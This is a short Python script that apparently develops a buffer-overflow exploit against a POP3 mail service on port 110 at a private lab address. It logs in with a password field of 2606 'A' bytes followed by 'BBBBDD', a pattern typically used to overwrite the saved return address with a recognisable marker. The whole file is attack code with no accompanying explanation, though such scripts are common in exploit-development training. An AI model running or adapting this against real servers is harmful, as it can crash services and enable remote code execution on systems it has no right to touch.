#!/usr/bin/env python3

import socket


TARGET_IP                    =    "192.168.1.62"

buffer = ("")

for i in range(2606):
    buffer += "A"
    
buffer += ("BBBBDD")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((TARGET_IP, 110))
s.recv(1024)
s.send("USER test \r\n".encode("ISO-8859-1"))
s.recv(1024)
s.send(("PASS " + buffer + "\r\n").encode("ISO-8859-1"))
s.send("QUIT\r\n".encode("ISO-8859-1"))
s.close()


